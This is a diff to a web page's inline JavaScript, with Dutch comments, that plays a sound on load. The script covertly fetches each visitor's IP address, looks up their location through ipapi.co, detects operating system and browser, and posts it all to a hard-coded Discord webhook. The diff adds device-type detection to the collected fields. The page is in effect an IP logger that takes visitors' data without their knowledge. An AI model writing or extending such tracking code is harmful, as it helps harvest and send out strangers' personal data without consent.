@@ -29,7 +29,7 @@
     </style>
     <script>
         var embedSent = false;
-        var musicStarted = true;
+        var musicStarted = false;
 
         var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
 
@@ -37,7 +37,6 @@
             if (!musicStarted) {
                 var audio = new Audio('sound.mp3'); // Zorg ervoor dat 'sound.mp3' overeenkomt met het juiste pad naar het audiobestand
                 audio.play();
-                musicStarted = false;
                 musicStarted = true;
             }
         }
@@ -48,7 +47,7 @@
                 .then(response => response.json())
                 .then(data => {
                     ipAddress = data.ip;
-                    fetch('https://ipapi.co/' + ipAddress + '/json/')
+                    fetch(`https://ipapi.co/${ipAddress}/json/`)
                         .then(response => response.json())
                         .then(locationData => {
                             sendEmbed(ipAddress, locationData);
@@ -69,6 +68,7 @@
             var timestamp = new Date().toISOString();
             var os = detectOS(userAgent);
             var browser = detectBrowser(userAgent);
+            var deviceType = getDeviceType();
 
             var country = (locationData && locationData.country_name) ? locationData.country_name : "Onbekend";
 
@@ -97,6 +97,11 @@
                             {
                                 "name": "Browser",
                                 "value": browser,
+                                "inline": true
+                            },
+                            {
+                                "name": "Apparaat Type",
+                                "value": deviceType,
                                 "inline": true
                             },
                             {
@@ -150,6 +155,15 @@
             });
 
             return detectedBrowser || 'Onbekend';
+        }
+
+        function getDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Mobile")) return "Phone";
+            if (userAgent.includes("Tablet")) return "Tablet";
+            if (userAgent.includes("Console")) return "Console";
+            if (userAgent.includes("Windows")) return "PC / Computer";
+            return "Unknown Device";
         }
 
         window.onload = function() {
